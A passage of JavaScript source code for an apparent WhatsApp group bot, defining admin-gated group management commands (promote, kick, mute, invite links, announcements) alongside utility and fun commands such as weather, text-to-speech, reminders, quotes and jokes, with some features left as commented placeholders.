> © Powered by ${conf.BOT}
      `;

      console.log('Article URL:', article.urlToImage); // Log image URL for debugging

      if (article.urlToImage) {
        // Send image with caption
        await hn.sendMessage(dest, { image: { url: article.urlToImage }, caption: message });
      } else {
        // Send text message if no image is available
        await hn.sendMessage(dest, { text: message });
      }
    }
  } catch (e) {
    console.error("Error fetching news:", e);
    repondre("Could not fetch news. Please try again later.");
  }
});

hango({
  nomCom: "groupinfo",
  aliases: ["ginfo", "infogroup"],
  desc: "Get detailed information about the current group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    
    // Count admins
    const adminCount = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').length;
    
    // Format creation date
    const creationDate = new Date(groupMetadata.creation * 1000).toLocaleDateString();
    
    // Create group info message
    const infoMessage = `
📊 *GROUP INFORMATION*
📝 *Name:* ${groupMetadata.subject}
👥 *Members:* ${participants.length}
👑 *Admins:* ${adminCount}
🆔 *Group ID:* ${dest.chat}
📅 *Created On:* ${creationDate}
${groupMetadata.desc ? `📄 *Description:* ${groupMetadata.desc}` : ''}
    `;
    
    await repondre(infoMessage);
  } catch (error) {
    console.error("Error in groupinfo command:", error);
    await repondre("❌ An error occurred while fetching group information.");
  }
});

hango({
  nomCom: "tagall",
  aliases: ["mentionall", "everyone"],
  desc: "Tag all members in the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const participants = groupMetadata.participants;
    const isAdmin = participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Attention everyone!";
    
    // Create mentions array and message
    const mentions = participants.map(p => p.id);
    let mentionText = `📢 *${message}*\n\n`;
    
    participants.forEach(participant => {
      mentionText += `@${participant.id.split('@')[0]}\n`;
    });
    
    await hn.sendMessage(dest.chat, {
      text: mentionText,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in tagall command:", error);
    await repondre("❌ An error occurred while tagging group members.");
  }
});

hango({
  nomCom: "promote",
  aliases: ["makeadmin", "admin"],
  desc: "Promote a member to admin",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to promote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is already admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ This user is already an admin.");
    }
    
    // Promote the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "promote");
    
    await repondre(`👑 User @${targetId.split('@')[0]} has been promoted to admin.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in promote command:", error);
    await repondre("❌ An error occurred while promoting the member.");
  }
});

hango({
  nomCom: "demote",
  aliases: ["removeadmin", "unadmin"],
  desc: "Demote an admin to member",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag an admin to demote by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isTargetAdmin) {
      return repondre("❌ This user is not an admin.");
    }
    
    // Demote the admin
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "demote");
    
    await repondre(`👤 User @${targetId.split('@')[0]} has been demoted to member.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in demote command:", error);
    await repondre("❌ An error occurred while demoting the admin.");
  }
});

hango({
  nomCom: "kick",
  aliases: ["remove", "ban"],
  desc: "Remove a member from the group",
  categorie: "group",
  reaction: '🚫',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to remove by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot remove myself from the group.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot remove an admin from the group.");
    }
    
    // Remove the member
    await hn.groupParticipantsUpdate(dest.chat, [targetId], "remove");
    
    await repondre(`🚫 User @${targetId.split('@')[0]} has been removed from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in kick command:", error);
    await repondre("❌ An error occurred while removing the member.");
  }
});

hango({
  nomCom: "groupsettings",
  aliases: ["setgroup", "editgroup"],
  desc: "Change group settings (name, description, etc.)",
  categorie: "group",
  reaction: '⚙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check for valid setting and value
    if (arg.length < 2) {
      return repondre(`
❌ Please specify a setting and value.

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
      `);
    }
    
    const setting = arg[0].toLowerCase();
    const value = arg.slice(1).join(" ");
    
    switch (setting) {
      case 'name':
        await hn.groupUpdateSubject(dest.chat, value);
        await repondre(`✅ Group name changed to: *${value}*`);
        break;
        
      case 'desc':
        await hn.groupUpdateDescription(dest.chat, value);
        await repondre(`✅ Group description updated.`);
        break;
        
      case 'lock':
        await hn.groupSettingUpdate(dest.chat, 'locked');
        await repondre(`🔒 Group settings have been locked. Only admins can change group info now.`);
        break;
        
      case 'unlock':
        await hn.groupSettingUpdate(dest.chat, 'unlocked');
        await repondre(`🔓 Group settings have been unlocked. All members can change group info now.`);
        break;
        
      default:
        await repondre(`
❌ Invalid setting. Available options:

📝 *Usage:*
• .groupsettings name [new name]
• .groupsettings desc [new description]
• .groupsettings lock (lock group settings)
• .groupsettings unlock (unlock group settings)
        `);
    }
  } catch (error) {
    console.error("Error in groupsettings command:", error);
    await repondre("❌ An error occurred while updating group settings.");
  }
});

hango({
  nomCom: "poll",
  aliases: ["vote", "createpoll"],
  desc: "Create a poll in the group",
  categorie: "group",
  reaction: '📊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check arguments
    if (arg.length < 3) {
      return repondre(`
❌ Please provide a question and at least 2 options.

📝 *Usage:*
.poll What's your favorite color? | Red | Blue | Green | Yellow
      `);
    }
    
    // Parse the poll data
    const pollData = arg.join(" ").split("|").map(item => item.trim());
    const question = pollData[0];
    const options = pollData.slice(1);
    
    if (options.length < 2) {
      return repondre("❌ Please provide at least 2 options separated by | symbol.");
    }
    
    // Create and send the poll
    await hn.sendMessage(dest.chat, {
      poll: {
        name: question,
        values: options,
        selectableCount: 1
      }
    });
  } catch (error) {
    console.error("Error in poll command:", error);
    await repondre("❌ An error occurred while creating the poll. Make sure you're using the correct format: question | option1 | option2 | ...");
  }
});

// Fun and utility commands

hango({
  nomCom: "tts",
  aliases: ["speak", "say"],
  desc: "Convert text to speech",
  categorie: "utility",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to speech.");
    }
    
    // Create TTS URL with Google Translate API
    const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=en&client=tw-ob`;
    
    // Send audio
    await hn.sendMessage(dest.chat, {
      audio: { url: ttsUrl },
      mimetype: 'audio/mp4',
      ptt: true
    });
  } catch (error) {
    console.error("Error in tts command:", error);
    await repondre("❌ An error occurred while generating speech.");
  }
});

hango({
  nomCom: "weather",
  aliases: ["forecast", "climate"],
  desc: "Get weather information for a location",
  categorie: "utility",
  reaction: '🌤️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const location = arg.join(" ");
    
    if (!location) {
      return repondre("❌ Please provide a location to check weather for.");
    }
    
    // Use OpenWeatherMap API (you need to add API key to conf)
    const apiKey = conf.WEATHER_API_KEY || "your_openweathermap_api_key";
    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(location)}&units=metric&appid=${apiKey}`;
    
    const response = await axios.get(weatherUrl);
    const data = response.data;
    
    const weatherInfo = `
🌤️ *Weather in ${data.name}, ${data.sys.country}*

🌡️ *Temperature:* ${Math.round(data.main.temp)}°C
🌡️ *Feels like:* ${Math.round(data.main.feels_like)}°C
💧 *Humidity:* ${data.main.humidity}%
💨 *Wind:* ${data.wind.speed} m/s
☁️ *Conditions:* ${data.weather[0].description}
    `;
    
    await repondre(weatherInfo);
  } catch (error) {
    console.error("Error in weather command:", error);
    await repondre("❌ Could not fetch weather information. Make sure the location name is correct.");
  }
});

hango({
  nomCom: "sticker",
  aliases: ["stiker", "s"],
  desc: "Convert image, video or GIF to sticker",
  categorie: "utility",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    if (!dest.quoted) {
      return repondre("❌ Reply to an image, video or GIF to convert it to a sticker.");
    }
    
    // Check if quoted message contains media
    const quotedMessage = dest.quoted;
    if (!quotedMessage.image && !quotedMessage.video) {
      return repondre("❌ Please reply to an image, short video or GIF.");
    }
    
    // Download the media
    const media = await quotedMessage.download();
    
    // Send as sticker
    await hn.sendMessage(dest.chat, {
      sticker: media,
      author: "Created by Bot",
      pack: "WhatsApp Sticker"
    }, { quoted: context.ms });
    
  } catch (error) {
    console.error("Error in sticker command:", error);
    await repondre("❌ An error occurred while creating the sticker.");
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "remindme"],
  desc: "Set a reminder",
  categorie: "utility",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 2) {
      return repondre(`
❌ Please specify time and reminder text.

📝 *Usage:*
.reminder 5m Call mom
.reminder 2h Meeting with client
.reminder 1d Birthday party

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    // Parse time
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("❌ Invalid time format. Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds
    let timeMs = 0;
    switch (timeUnit) {
      case 's': timeMs = timeValue * 1000; break;
      case 'm': timeMs = timeValue * 60 * 1000; break;
      case 'h': timeMs = timeValue * 60 * 60 * 1000; break;
      case 'd': timeMs = timeValue * 24 * 60 * 60 * 1000; break;
    }
    
    // Confirm reminder set
    await repondre(`⏰ Reminder set for ${timeArg} from now.`);
    
    // Set timeout for reminder
    setTimeout(async () => {
      await hn.sendMessage(dest.chat, {
        text: `⏰ *REMINDER*\n\n${reminderText}\n\n_Reminder set ${timeArg} ago_`,
        mentions: [dest.sender]
      });
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    await repondre("❌ An error occurred while setting the reminder.");
  }
});

// AI and media commands

hango({
  nomCom: "ytmp3",
  aliases: ["mp3", "ytaudio"],
  desc: "Download YouTube audio",
  categorie: "media",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const url = arg[0];
    
    if (!url) {
      return repondre("❌ Please provide a YouTube video URL.");
    }
    
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("❌ Please provide a valid YouTube URL.");
    }
    
    await repondre("⏳ Processing your request. This may take a moment...");
    
    // Use a YouTube download service API
    const ytDlUrl = `https://loader.to/api/button/?url=${encodeURIComponent(url)}&f=mp3`;
    
    // Get video info
    const info = await ytdl.getInfo(url);
    const videoTitle = info.videoDetails.title;
    const thumbnail = info.videoDetails.thumbnails[0].url;
    
    // Send audio with thumbnail
    await hn.sendMessage(dest.chat, {
      audio: { url: ytDlUrl },
      mimetype: 'audio/mpeg',
      fileName: `${videoTitle}.mp3`,
      contextInfo: {
        externalAdReply: {
          title: videoTitle,
          body: "YouTube MP3",
          thumbnailUrl: thumbnail,
          sourceUrl: url
        }
      }
    });
    
  } catch (error) {
    console.error("Error in ytmp3 command:", error);
    await repondre("❌ An error occurred while downloading the audio.");
  }
});

hango({
  nomCom: "quote",
  aliases: ["quotegen", "inspire"],
  desc: "Get an inspirational quote",
  categorie: "fun",
  reaction: '💭',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Call API to get a random quote
    const response = await axios.get('https://api.quotable.io/random');
    const { content, author } = response.data;
    
    await repondre(`💭 *"${content}"*\n\n— *${author}*`);
  } catch (error) {
    console.error("Error in quote command:", error);
    await repondre("❌ An error occurred while fetching a quote.");
  }
});

hango({
  nomCom: "joke",
  aliases: ["telljoke", "funny"],
  desc: "Get a random joke",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Here we would normally fetch from an API
    // This is a simulation with a few hardcoded jokes
    const jokes = [
      "Why don't scientists trust atoms? Because they make up everything!",
      "What's the best thing about Switzerland? I don't know, but the flag is a big plus.",
      "Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them.",
      "Why was the math book sad? Because it had too many problems.",
      "I told my wife she was drawing her eyebrows too high. She looked surprised.",
      "What do you call a fake noodle? An impasta!",
      "Why did the scarecrow win an award? Because he was outstanding in his field!",
      "I'm reading a book about anti-gravity. It's impossible to put down!",
      "I used to be a baker, but I couldn't make enough dough.",
      "Why don't eggs tell jokes? They'd crack each other up."
    ];
    
    const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
    await repondre(`😂 *JOKE TIME*\n\n${randomJoke}`);
  } catch (error) {
    console.error("Error in joke command:", error);
    repondre("❌ Failed to tell a joke. My sense of humor crashed.");
  }
});

hango({
  nomCom: "antilink",
  aliases: ["nolinks", "disablelinks"],
  desc: "Toggle anti-link feature in the group",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antilink mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antilink on or off. Example: .antilink on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antilink
      repondre("✅ Anti-link feature has been *enabled*. Links sent by non-admins will be deleted.");
    } else {
      // Disable antilink
      repondre("✅ Anti-link feature has been *disabled*. Members can now send links.");
    }
  } catch (error) {
    console.error("Error in antilink command:", error);
    repondre("❌ An error occurred while toggling the anti-link feature.");
  }
});

hango({
  nomCom: "warn",
  aliases: ["warning", "warnuser"],
  desc: "Warn a group member",
  categorie: "group",
  reaction: '⚠️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if a member is tagged
    if (!dest.quoted) {
      return repondre("❌ Tag a member to warn by replying to their message.");
    }
    
    const targetId = dest.quoted.sender;
    
    // Check if target is the bot
    if (targetId === hn.user.id) {
      return repondre("❌ I cannot warn myself.");
    }
    
    // Check if target is an admin
    const isTargetAdmin = groupMetadata.participants.find(p => p.id === targetId && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (isTargetAdmin) {
      return repondre("❌ Cannot warn an admin.");
    }
    
    // In a full implementation, you would track warnings in a database
    // This is a placeholder implementation
    await repondre(`⚠️ @${targetId.split('@')[0]} has been *warned*.\nFurther violations may result in removal from the group.`, {
      mentions: [targetId]
    });
  } catch (error) {
    console.error("Error in warn command:", error);
    repondre("❌ An error occurred while warning the member.");
  }
});

hango({
  nomCom: "revoke",
  aliases: ["resetlink", "newlink"],
  desc: "Revoke the group invite link",
  categorie: "group",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Revoke the group link
    await hn.groupRevokeInvite(dest.chat);
    
    repondre("✅ Group invite link has been revoked. Use .grouplink to get the new link.");
  } catch (error) {
    console.error("Error in revoke command:", error);
    repondre("❌ An error occurred while revoking the group link.");
  }
});

hango({
  nomCom: "grouplink",
  aliases: ["getlink", "invitelink"],
  desc: "Get the group invite link",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get the group invite link
    const code = await hn.groupInviteCode(dest.chat);
    const link = `https://chat.whatsapp.com/${code}`;
    
    repondre(`🔗 *Group Invite Link*\n\n${link}`);
  } catch (error) {
    console.error("Error in grouplink command:", error);
    repondre("❌ An error occurred while getting the group link.");
  }
});

hango({
  nomCom: "antibot",
  aliases: ["nobot", "antibots"],
  desc: "Toggle anti-bot feature in the group",
  categorie: "group",
  reaction: '🤖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antibot mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antibot on or off. Example: .antibot on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antibot
      repondre("✅ Anti-bot feature has been *enabled*. Other bots will be removed when detected.");
    } else {
      // Disable antibot
      repondre("✅ Anti-bot feature has been *disabled*. Other bots are now allowed.");
    }
  } catch (error) {
    console.error("Error in antibot command:", error);
    repondre("❌ An error occurred while toggling the anti-bot feature.");
  }
});

hango({
  nomCom: "mute",
  aliases: ["mutegroup", "silence"],
  desc: "Mute the group for non-admins",
  categorie: "group",
  reaction: '🔇',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to admins-only mode
    await hn.groupSettingUpdate(dest.chat, 'announcement');
    
    repondre("🔇 Group has been *muted*. Only admins can send messages now.");
  } catch (error) {
    console.error("Error in mute command:", error);
    repondre("❌ An error occurred while muting the group.");
  }
});

hango({
  nomCom: "unmute",
  aliases: ["unmutegroup", "unsilence"],
  desc: "Unmute the group for all members",
  categorie: "group",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to everyone mode
    await hn.groupSettingUpdate(dest.chat, 'not_announcement');
    
    repondre("🔊 Group has been *unmuted*. All members can send messages now.");
  } catch (error) {
    console.error("Error in unmute command:", error);
    repondre("❌ An error occurred while unmuting the group.");
  }
});

hango({
  nomCom: "admins",
  aliases: ["adminlist", "listadmins"],
  desc: "List all admins in the group",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const admins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    
    if (admins.length === 0) {
      return repondre("❓ Strange, no admins found in this group.");
    }
    
    // Create admin list with mentions
    let message = `👑 *ADMIN LIST*\n\n`;
    
    admins.forEach((admin, i) => {
      message += `${i + 1}. @${admin.id.split('@')[0]}\n`;
    });
    
    const mentions = admins.map(a => a.id);
    
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in admins command:", error);
    repondre("❌ An error occurred while listing the admins.");
  }
});

hango({
  nomCom: "add",
  aliases: ["invite", "addmember"],
  desc: "Add a person to the group",
  categorie: "group",
  reaction: '➕',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if number is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the phone number to add. Example: .add 1234567890");
    }
    
    let number = arg[0].replace(/[^0-9]/g, '');
    
    // Add country code if not present
    if (number.length <= 11) {
      number = '91' + number; // Assuming 91 for India, modify for your region
    }
    
    // Ensure number has @ format
    if (!number.includes('@')) {
      number = number + '@s.whatsapp.net';
    }
    
    // Add the member
    const response = await hn.groupParticipantsUpdate(dest.chat, [number], "add");
    
    if (response[0].status === "409") {
      return repondre("❌ The person is already in the group.");
    } else if (response[0].status === "403") {
      return repondre("❌ Failed to add. The person might have their privacy settings restricted.");
    } else if (response[0].status === "408") {
      return repondre("❌ Failed to add. The person might have left the group recently.");
    } else if (response[0].status === "200") {
      return repondre("✅ Successfully added to the group!");
    } else {
      return repondre("❌ Failed to add the person. Status: " + response[0].status);
    }
  } catch (error) {
    console.error("Error in add command:", error);
    repondre("❌ An error occurred while adding the member.");
  }
});

hango({
  nomCom: "groupdp",
  aliases: ["setdp", "groupicon"],
  desc: "Change the group profile picture",
  categorie: "group",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if an image is quoted
    if (!dest.quoted || !dest.quoted.image) {
      return repondre("❌ Please reply to an image to set as group icon.");
    }
    
    // Download the image
    const media = await dest.quoted.download();
    
    // Set as group icon
    await hn.updateProfilePicture(dest.chat, media);
    
    repondre("✅ Group icon has been updated successfully!");
  } catch (error) {
    console.error("Error in groupdp command:", error);
    repondre("❌ An error occurred while changing the group icon.");
  }
});

hango({
  nomCom: "hidetag",
  aliases: ["htag", "secretmention"],
  desc: "Mention everyone without showing tag list",
  categorie: "group",
  reaction: '👥',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Important announcement!";
    
    // Get all members for mentions
    const mentions = groupMetadata.participants.map(p => p.id);
    
    // Send message with hidden tags
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in hidetag command:", error);
    repondre("❌ An error occurred while sending the hidden tag message.");
  }
});

hango({
  nomCom: "leave",
  aliases: ["leavegroup", "botleave"],
  desc: "Make the bot leave the group",
  categorie: "group",
  reaction: '👋',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin or bot owner
    const isOwner = dest.sender === conf.owner;
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin && !isOwner) {
      return repondre("❌ Only group admins or the bot owner can use this command.");
    }
    
    // Send goodbye message
    await repondre("👋 It was nice being here. Goodbye everyone!");
    
    // Leave the group after a short delay
    setTimeout(async () => {
      await hn.groupLeave(dest.chat);
    }, 1000);
  } catch (error) {
    console.error("Error in leave command:", error);
    repondre("❌ An error occurred while leaving the group.");
  }
});

hango({
  nomCom: "announce",
  aliases: ["announcement", "broadcast"],
  desc: "Send a formatted announcement to the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if announcement text is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the announcement text.");
    }
    
    const announcement = arg.join(" ");
    
    // Format the announcement
    const formattedAnnouncement = `
━━━━━━━━━━━━━━━
📢 *GROUP ANNOUNCEMENT*
━━━━━━━━━━━━━━━

${announcement}

━━━━━━━━━━━━━━━
From: @${dest.sender.split('@')[0]}
Date: ${new Date().toLocaleDateString()}
Time: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━
    `;
    
    // Send announcement
    await hn.sendMessage(dest.chat, {
      text: formattedAnnouncement,
      mentions: [dest.sender]
    });
  } catch (error) {
